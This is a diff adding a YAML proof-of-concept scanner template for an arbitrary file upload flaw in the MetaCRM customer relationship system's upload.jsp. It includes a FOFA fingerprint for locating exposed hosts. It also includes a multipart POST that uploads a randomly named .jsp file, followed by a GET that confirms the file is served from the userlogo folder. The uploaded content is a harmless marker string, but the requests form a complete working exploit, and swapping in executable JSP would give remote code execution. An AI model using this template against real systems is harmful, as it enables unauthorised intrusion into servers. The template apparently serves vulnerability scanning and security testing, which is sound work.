@@ -1,0 +1,67 @@
+id: poc-yaml-metacrm-upload-jsp-anyfile-upload
+info:
+  name: MetaCRM客户关系管理系统 upload.jsp 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: MetaCRM客户关系管理系统
+  fofa: body="/common/scripts/basic.js"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /develop/systparam/softlogo/upload.jsp?key=null&form=null&field=null&filetitle=null&folder=null&
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0Mh3BfgWszxRFokh
+  data: '------WebKitFormBoundary0Mh3BfgWszxRFokh
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.jsp"
+
+    Content-Type: text/plain
+
+
+    {{.t2}}
+
+    ------WebKitFormBoundary0Mh3BfgWszxRFokh
+
+    Content-Disposition: form-data; name="key"
+
+
+    null
+
+    ------WebKitFormBoundary0Mh3BfgWszxRFokh
+
+    Content-Disposition: form-data; name="form"
+
+
+    null
+
+    ------WebKitFormBoundary0Mh3BfgWszxRFokh
+
+    Content-Disposition: form-data; name="field"
+
+
+    null
+
+    ------WebKitFormBoundary0Mh3BfgWszxRFokh
+
+    Content-Disposition: form-data; name="filetitile"
+
+
+    null
+
+    ------WebKitFormBoundary0Mh3BfgWszxRFokh
+
+    Content-Disposition: form-data; name="filefolder"
+
+
+    null
+
+    ------WebKitFormBoundary0Mh3BfgWszxRFokh--'
+  expression: "status_code == 200 && \ncontains(body,\"userfile\") &&\ncontains(body,\"\
+    value=\")\n"
+- method: GET
+  path: /userfile/default/userlogo/{{.t1}}.jsp
+  expression: status_code == 200 && body == t2
+transport: http
